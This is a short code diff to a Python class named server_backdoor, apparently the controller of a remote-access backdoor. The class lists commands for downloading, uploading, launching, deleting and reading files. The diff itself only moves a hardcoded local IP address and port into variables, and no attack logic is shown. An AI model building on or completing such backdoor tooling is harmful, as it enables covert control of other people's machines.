@@ -7,6 +7,9 @@ import datetime
 from halo import Halo
 from colorama import Fore, init
 
+ip = "192.168.0.76"
+port = 8080
+
 class server_backdoor:
     required_arguments = ["download", "troll", "upload", "launch", "del", "read", "psound", "sdmsg", "cgstate"]
 
@@ -207,5 +210,5 @@ class server_backdoor:
  
             print(result)
 
-server = server_backdoor("192.168.0.76", 8080)
+server = server_backdoor(ip, port)
 server.run()
